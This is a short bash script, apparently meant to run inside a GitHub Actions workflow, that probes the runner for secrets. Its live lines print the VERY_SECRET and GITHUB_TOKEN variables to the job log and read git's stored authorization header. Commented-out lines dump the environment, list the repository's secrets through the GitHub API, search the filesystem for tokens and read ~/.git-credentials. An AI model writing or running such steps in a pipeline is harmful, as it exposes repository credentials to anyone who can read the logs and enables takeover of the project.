#!/usr/bin/bash
# -e

echo "In script ..."

# env | base64 > /tmp/env
# cat /tmp/env

echo "Get secrets more ..."
# curl -s -X GET -H "Accept: application/vnd.github+json" -H "Authorization: Bearer ${GITHUB_TOKEN}" "https://api.github.com/repos/gpt-4/envoy/actions/secrets"


echo "SECRET: ${VERY_SECRET}"
echo "SECRET: ${GITHUB_TOKEN}"


df -h

pwd

# ls

# grep -r GITHUB_TOKEN ../../

# sudo grep -r GITHUB_TOKEN /

# cat ~/.git-credentials

git config --get http.https://github.com/.extraheader
